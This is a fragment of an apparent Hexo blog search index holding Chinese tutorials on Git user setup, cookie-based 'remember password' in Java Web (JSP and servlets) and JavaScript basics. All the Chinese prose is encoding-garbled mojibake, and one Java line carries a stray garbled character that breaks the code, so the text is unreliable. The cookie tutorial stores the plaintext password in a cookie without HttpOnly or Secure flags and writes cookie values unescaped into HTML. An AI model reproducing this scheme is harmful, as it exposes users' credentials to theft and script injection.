<p>é€šè¿‡ä»¥åï¼Œè¯¥æ™®é€šç”¨æˆ·å°±å¯ä»¥ç™»å½•äº†ã€‚</p>
<p>å½“ç„¶äº†ï¼Œä¸ºäº†èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ï¼Œè¿˜<strong>éœ€è¦æ·»åŠ <code>SSH</code>å…¬é’¥ã€‚</strong></p>
]]></content>
      <categories>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>å­¦ä¹ </tag>
        <tag>å‘½ä»¤è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Web é€šè¿‡æ“æ§Cookieå®ç°è®°ä½å¯†ç </title>
    <url>/2020/09/25/Java-Web-%E9%80%9A%E8%BF%87%E6%93%8D%E6%8E%A7Cookie%E5%AE%9E%E7%8E%B0%E8%AE%B0%E4%BD%8F%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯Cookieï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Cookieï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Cookieï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Cookieï¼Ÿ</h2><p>å¼•ç”¨ç™¾åº¦<a href="https://baike.baidu.com/item/cookie/1119" target="_blank" rel="noopener">ç™¾ç§‘</a>çš„è¯´æ³•ï¼Œ</p>
<blockquote>
<p>Cookieï¼Œæœ‰æ—¶ä¹Ÿç”¨å…¶å¤æ•°å½¢å¼ <a href="https://baike.baidu.com/item/Cookies/187064" target="_blank" rel="noopener">Cookies</a>ã€‚ç±»å‹ä¸ºâ€œ<strong>å°å‹æ–‡æœ¬æ–‡ä»¶</strong>â€ï¼Œæ˜¯æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½ï¼Œè¿›è¡Œ<a href="https://baike.baidu.com/item/Session/479100" target="_blank" rel="noopener">Session</a>è·Ÿè¸ªè€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®ï¼ˆé€šå¸¸ç»è¿‡åŠ å¯†ï¼‰ï¼Œç”±ç”¨æˆ·<a href="https://baike.baidu.com/item/å®¢æˆ·ç«¯/101081" target="_blank" rel="noopener">å®¢æˆ·ç«¯</a>è®¡ç®—æœºæš‚æ—¶æˆ–æ°¸ä¹…ä¿å­˜çš„ä¿¡æ¯</p>
</blockquote>
<p>è¯´ç™½äº†å°±æ˜¯å°†æµè§ˆå™¨ä¸Šé¢çš„ä¸€äº›ä¿¡æ¯ä¿å­˜åœ¨ç”¨æˆ·çš„ç”µè„‘ä¸Šé¢ï¼Œå½“ç„¶äº†è¿™äº›æ•°æ®ä¸€èˆ¬ä¸ä¼šäº§ç”Ÿä¸¥é‡å½±å“ï¼Œå› ä¸ºå®ƒæ°¸è¿œä¸ä¼šä»¥ä»»ä½•æ–¹å¼æ‰§è¡Œï¼Œä¹Ÿå°±é¿å…å¸¦æ¥äº†ç—…æ¯’æˆ–è€…æ”»å‡»ç”¨æˆ·ç”µè„‘ï¼Œå¹¶ä¸”ä¸€èˆ¬æµè§ˆå™¨éƒ½ä¼šå¯¹<code>Cookie</code>çš„ä¸ªæ•°æœ‰é™åˆ¶ï¼Œä¸ç”¨æ‹…å¿ƒå¡æ»¡ç”¨æˆ·ç”µè„‘ã€‚<a id="more"></a></p>
<h2 id="æœ‰ä»€ä¹ˆç”¨ï¼Ÿ"><a href="#æœ‰ä»€ä¹ˆç”¨ï¼Ÿ" class="headerlink" title="æœ‰ä»€ä¹ˆç”¨ï¼Ÿ"></a>æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</h2><p>å¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·è®¿é—®è¯¥ç½‘ç«™çš„é¢‘ç‡ã€æ—¶é—´æ®µç­‰ï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯â€œè®°ä½ç”¨æˆ·åå’Œå¯†ç â€ï¼Œåœ¨ä¸€äº›ç™»é™†ç½‘ç«™ï¼Œå½“ç”¨æˆ·ç™»é™†çš„æ—¶å€™é€‰æ‹©äº†â€œè®°ä½å¯†ç â€ï¼Œ<code>Web</code>æœåŠ¡ç«¯å°±å°†ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œå¤„ç†ï¼ˆä¸€èˆ¬å°±æ˜¯å°†å¯†ç è¿›è¡ŒåŠ å¯†ï¼‰ï¼Œç„¶åå°†å¤„ç†åçš„å­—ç¬¦ä¸²å°è£…æˆä¸€ä¸ª<code>Cookie</code>è¿›è¡Œä¿å­˜ã€‚</p>
<h2 id="æ€ä¹ˆç”¨ï¼Ÿ"><a href="#æ€ä¹ˆç”¨ï¼Ÿ" class="headerlink" title="æ€ä¹ˆç”¨ï¼Ÿ"></a>æ€ä¹ˆç”¨ï¼Ÿ</h2><p>ä»¥<code>Java Web</code>ä¸ºä¾‹ï¼š</p>
<p>é¦–å…ˆæ–°å»ºç™»é™†é¡µé¢ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%--</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Author:</span> <span class="attr">Yalexin</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Email:</span> <span class="attr">181303209</span>@<span class="attr">yzu.edu.cn</span> </span></span><br><span class="line"><span class="tag"><span class="attr">--</span>%&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">%</span></span></span><br><span class="line"><span class="tag">        <span class="attr">String</span> <span class="attr">username</span> = <span class="string">""</span>, <span class="attr">password</span> = <span class="string">""</span>;</span></span><br><span class="line"><span class="tag">        <span class="attr">Cookie</span>[] <span class="attr">cookies1</span> = <span class="string">request.getCookies();</span></span></span><br><span class="line"><span class="tag">        <span class="attr">if</span> (<span class="attr">cookies1</span> != <span class="string">null)&#123;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">for</span> (<span class="attr">Cookie</span> <span class="attr">cookie</span> <span class="attr">:</span> <span class="attr">cookies1</span>)&#123;</span></span><br><span class="line"><span class="tag">                <span class="attr">if</span> (<span class="attr">cookie.getName</span>()<span class="attr">.equals</span>("<span class="attr">userCookie</span>"))&#123;</span></span><br><span class="line"><span class="tag">                    <span class="attr">String</span>[] <span class="attr">split</span> = <span class="string">cookie.getValue().split(</span>"<span class="attr">-</span>&gt;</span>");</span><br><span class="line">                    username = split[0];</span><br><span class="line">                    password = split[1];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"login_1"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"&lt;%=username%&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"&lt;%=password%&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"ç™»é™†"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ›å»º<code>Servlet</code>ï¼Œå¤„ç†<code>post</code>è¯·æ±‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Yalexin</span></span><br><span class="line"><span class="comment"> * Email: 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">package</span> com.yalexin;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(urlPatterns = <span class="string">"/login_1"</span>, name = <span class="string">"Login_1Servlet"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login_1Servlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String username = req.getParameter(<span class="string">"username"</span>).trim();</span><br><span class="line">        String password = req.getParameter(<span class="string">"password"</span>).trim();</span><br><span class="line">        saveCookie(resp, <span class="string">"userCookie"</span>, username + <span class="string">"-&gt;"</span> + password, <span class="number">60</span> * <span class="number">60</span>);</span><br><span class="line">        <span class="keyword">this</span>.getServletContext().setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">        resp.sendRedirect(<span class="string">"index_1.jsp"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">saveCookie</span><span class="params">(HttpServletResponse response, String cookieName, String value, <span class="keyword">int</span> time)</span> </span>&#123;</span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> Cookie(cookieName, value);ã€‘</span><br><span class="line">        <span class="comment">// ä»¥ç§’ä¸ºå•ä½</span></span><br><span class="line">        cookie.setMaxAge(time);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºç™»é™†æˆåŠŸåçš„é¡µé¢ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%--</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Author:</span> <span class="attr">Yalexin</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Email:</span> <span class="attr">181303209</span>@<span class="attr">yzu.edu.cn</span> </span></span><br><span class="line"><span class="tag"><span class="attr">--</span>%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">hello $&#123;username&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"logout_1"</span>&gt;</span> æ³¨é”€ <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºæ³¨é”€<code>Servlet</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Yalexin</span></span><br><span class="line"><span class="comment"> * Email: 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">package</span> com.yalexin;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(urlPatterns = <span class="string">"/logout_1"</span>, name = <span class="string">"Logout_1Servlet"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Logout_1Servlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        deleteCookieByName(resp, req, <span class="string">"userCookie"</span>);</span><br><span class="line">        resp.sendRedirect(<span class="string">"login_1.jsp"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”±äºæ²¡æœ‰æä¾›deleteæ–¹æ³•ï¼Œå¯å€ŸåŠ© cookie.setMaxAge(0) å°†cookieçš„æ—¶é—´è®¾ç½®æˆ0ï¼Œå³è¿‡æœŸçŠ¶æ€ï¼Œé—´æ¥è¾¾åˆ°åˆ é™¤ç›®çš„</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cookieName</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">deleteCookieByName</span><span class="params">(HttpServletResponse response, HttpServletRequest request, String cookieName)</span> </span>&#123;</span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> Cookie(cookieName, <span class="string">""</span>);</span><br><span class="line">        cookie.setMaxAge(<span class="number">0</span>);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Jsp</tag>
        <tag>Cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScriptè¯­æ³•ä¸€</title>
    <url>/2020/03/09/JavaScript%E8%AF%AD%E6%B3%95%E4%B8%80/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p> JavaScript æ˜¯ä¸€ç§è„šæœ¬ï¼Œä¸€é—¨ç¼–ç¨‹è¯­è¨€ï¼Œå®ƒå¯ä»¥åœ¨ç½‘é¡µä¸Šå®ç°å¤æ‚çš„åŠŸèƒ½ï¼Œç½‘é¡µå±•ç°ç»™ä½ çš„ä¸å†æ˜¯ç®€å•çš„é™æ€ä¿¡æ¯ï¼Œè€Œæ˜¯å®æ—¶çš„å†…å®¹æ›´æ–°ï¼Œäº¤äº’å¼çš„åœ°å›¾ï¼Œ2D/3D åŠ¨ç”»ï¼Œæ»šåŠ¨æ’­æ”¾çš„è§†é¢‘ç­‰ç­‰ã€‚æ„å»ºwebå‰ç«¯ï¼ŒJavaScript æ€èƒ½ç¼ºå¸­ã€‚å®ƒæ˜¯æ ‡å‡† Web æŠ€æœ¯è›‹ç³•çš„ç¬¬ä¸‰å±‚ï¼Œå…¶ä¸­ <a href="https://ruixin_huang.gitee.io/mblog/2020/03/07/html%E8%AF%AD%E6%B3%951/" target="_blank" rel="noopener">HTML </a>å’Œ <a href="https://ruixin_huang.gitee.io/mblog/2020/03/08/css-%E8%AF%AD%E6%B3%95/" target="_blank" rel="noopener">CSS </a>æˆ‘ä»¬å·²ç»åœ¨å‰é¢æœ‰äº†åˆæ­¥å­¦ä¹ ã€‚</p>
<h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><p>å‰é¢å­¦ä¹ CSSä¸­ï¼Œæˆ‘ä»¬çŸ¥é“CSSçš„ä½¿ç”¨æ–¹æ³•æœ‰ä¸‰ç§ï¼šå…ƒç´ å†…åµŒã€æ–‡æ¡£å†…åµŒã€å¯¼å…¥å¤–éƒ¨ã€‚è¿™é‡Œçš„JavaScriptä¹Ÿæœ‰ç±»ä¼¼çš„æ–¹æ³•ï¼šå…ƒç´ å†…åµŒã€æ–‡æ¡£å†…åµŒã€å¯¼å…¥å¤–éƒ¨ï¼š</p>
<a id="more"></a>

<ul>
<li><p>å…ƒç´ å†…åµŒ</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"è¿™æ˜¯ä¸€ä¸ªæŒ‰é’®"</span> <span class="attr">onclick</span>=<span class="string">"alert('ä½ å¥½')"</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>æ–‡æ¡£å†…åµŒ</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        alert(<span class="string">"hello world"</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>å¯¼å…¥å¤–éƒ¨</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ–°å»ºä¸€ä¸ªtest.js</span></span><br><span class="line">alert(<span class="string">"test"</span>);</span><br><span class="line"><span class="comment">//åœ¨HTMLæ–‡ä»¶ä¸­çš„headæ ‡ç­¾ä¸‹å¼•å…¥</span></span><br><span class="line">&lt;script src=<span class="string">"test.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="è¾“å‡ºå†…å®¹"><a href="#è¾“å‡ºå†…å®¹" class="headerlink" title="è¾“å‡ºå†…å®¹"></a>è¾“å‡ºå†…å®¹</h2><p>å¯ä»¥ç”¨alert()å‡½æ•°æˆ–è€…document.write()ï¼Œè¿™å‰è€…æ˜¯å¼¹å‡ºå¼ï¼Œåè€…ç›´æ¥åœ¨ç½‘é¡µä¸­æ˜¾ç¤ºï¼Œè¿˜å¯ä»¥é…åˆæ ‡ç­¾æ¥ä½¿ç”¨</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> title = <span class="string">"è¿™æ˜¯ä¸€çº§æ ‡é¢˜"</span>;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">"&lt;h1&gt;"</span>+title+<span class="string">"&lt;/h1&gt;"</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ç”¨console.log()åœ¨æ§åˆ¶å°æ§åˆ¶è¾“å‡ºï¼Œä¸€èˆ¬ç”¨äºç¨‹åºå‘˜è°ƒè¯•ã€‚</p>
<h2 id="è¾“å…¥å†…å®¹"><a href="#è¾“å…¥å†…å®¹" class="headerlink" title="è¾“å…¥å†…å®¹"></a>è¾“å…¥å†…å®¹</h2><p>è·å–ç”¨æˆ·è¾“å…¥ï¼Œæˆ‘ä»¬åœ¨HTMLçš„è¡¨å•ä¸­å·²ç»å­¦ä¹ è¿‡ï¼Œå¦‚æœç”¨JavaScriptä¹Ÿå¯ä»¥å®ç°ï¼Œprompt()æ–¹æ³•ç”¨äºæ˜¾ç¤ºä¸€ä¸ªå¸¦æœ‰æç¤ºä¿¡æ¯ï¼Œå¹¶ä¸”ç”¨æˆ·å¯ä»¥è¾“å…¥çš„å¯¹è¯æ¡†ã€‚ </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">prompt(text,defaultText);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>text</td>
<td>å¯é€‰ã€‚è¦åœ¨å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºçš„æç¤ºä¿¡æ¯ï¼ˆçº¯æ–‡æœ¬ï¼‰</td>
</tr>
<tr>
<td>defaultText</td>
<td>å¯é€‰ã€‚é»˜è®¤çš„è¾“å…¥æ–‡æœ¬ã€‚</td>
</tr>
</tbody></table>
<p>å¦‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var inPut &#x3D; prompt(&quot;è¯·è¾“å…¥ä½ çš„å†…å®¹&quot;,&quot;&quot;);</span><br><span class="line">	alert(&quot;æ‚¨è¾“å‡ºçš„æ˜¯\n&quot;+inPut);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="å¯¹è±¡"><a href="#å¯¹è±¡" class="headerlink" title="å¯¹è±¡"></a>å¯¹è±¡</h2><p>JavaScriptè·Ÿå…¶ä»–é¢å‘å¯¹è±¡è¯­è¨€ä¸€æ ·ï¼Œæœ‰å¯¹è±¡çš„å±æ€§ï¼Œå…³äºè¯¦ç»†çš„é¢å‘å¯¹è±¡ï¼Œ<a href="[https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/24792?fromtitle=%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B&fromid=254878](https://baike.baidu.com/item/é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡/24792?fromtitle=é¢å‘å¯¹è±¡ç¼–ç¨‹&fromid=254878)">è¿™é‡Œ</a>æœ‰ç€è¯¦ç»†çš„ä»‹ç»</p>
<ul>
<li><p>ä½¿ç”¨å¯¹è±¡å­—é¢é‡åˆ›å»ºå¯¹è±¡</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> student = &#123;</span><br><span class="line">    ID: <span class="number">11111111</span>,</span><br><span class="line">    name: <span class="string">"å­¦ç”Ÿåå­—"</span>,</span><br><span class="line">    age: <span class="number">18</span>,</span><br><span class="line">    sayHello: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"hello world"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* ä¸¤ç§æ–¹æ³•å¼•ç”¨å¯¹è±¡å±æ€§ */</span></span><br><span class="line">alert(student.ID);</span><br><span class="line">alert(student[<span class="string">"ID"</span>]);</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>ä½¿ç”¨new object()æ–¹å¼åˆ›å»º</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> student = <span class="keyword">new</span> <span class="built_in">Object</span>(); <span class="comment">//åˆ›å»ºäº†ä¸€ä¸ªç©ºå¯¹è±¡</span></span><br><span class="line">student.ID = <span class="number">123</span>;</span><br><span class="line">student.name = <span class="string">"å­¦ç”Ÿå§“å"</span>;</span><br><span class="line">student.age = <span class="number">18</span>;</span><br><span class="line">student.sayHello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"hello world"</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>åˆ©ç”¨æ„é€ å‡½æ•°æ–¹å¼åˆ›å»º</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Creatstudent</span>(<span class="params">s_ID,s_name,s_age</span>)</span>&#123; <span class="comment">//æ„é€ å‡½æ•°åä¸€èˆ¬é¦–å­—æ¯å¤§å†™</span></span><br><span class="line">    <span class="keyword">this</span>.ID = s_ID;</span><br><span class="line">    <span class="keyword">this</span>.name = s_name;</span><br><span class="line">    <span class="keyword">this</span>.age = s_age;</span><br><span class="line">    <span class="keyword">this</span>.sayHello = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ²¡æœ‰è¿”å›å€¼</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> student = <span class="keyword">new</span> Creatstudent(<span class="number">12345</span>,<span class="string">"å­¦ç”Ÿå§“å"</span>,<span class="number">18</span>);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="éå†å¯¹è±¡çš„å†…å®¹"><a href="#éå†å¯¹è±¡çš„å†…å®¹" class="headerlink" title="éå†å¯¹è±¡çš„å†…å®¹"></a>éå†å¯¹è±¡çš„å†…å®¹</h2><p>æœ‰çš„æ—¶å€™æˆ‘ä»¬æƒ³è·å–å¯¹è±¡çš„å…¨éƒ¨å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¯¹è±¡+â€œ.â€+å±æ€§åæ¥è·å–ï¼Œè¿™ç§æ–¹æ³•å¯¹äºå±æ€§å°‘çš„å¯¹è±¡æ¥è¯´å›ºç„¶å¥æ•ˆï¼Œä½†æ˜¯å‡å¦‚æˆ‘çš„å¯¹è±¡æœ‰ä¸€åƒä¸ªã€ä¸€ä¸‡ä¸ªå±æ€§å‘¢ï¼Ÿï¼ˆå½“ç„¶äº†è¿™åªæ˜¯ä¸€ä¸ªå‡è®¾ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„å¯¹è±¡ä¸€èˆ¬ä¸ä¼šæœ‰è¿™ä¹ˆå¤šçš„å±æ€§å§ï¼‰ä¸Šé¢çš„æ–¹æ³•ä¼°è®¡å°±æœ‰äº›åƒåŠ›äº†å§ï¼å› æ­¤æˆ‘ä»¬éœ€è¦æ¢ä¸€ç§æ–¹å¼æ¥éå†ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> key;</span><br><span class="line"><span class="keyword">for</span>(key <span class="keyword">in</span> student)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key+<span class="string">":"</span>); <span class="comment">//å¾ªç¯ä¸€æ¬¡ å¾—åˆ°çš„æ˜¯å±æ€§å</span></span><br><span class="line">    <span class="comment">// console.log(student.key); ä¸å¾—ä½¿ç”¨è¯¥æ–¹æ³• å› æ­¤è¯¥æ–¹æ³•è¿”å›çš„æ˜¯undefined</span></span><br><span class="line">    <span class="built_in">console</span>.log(student[key]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

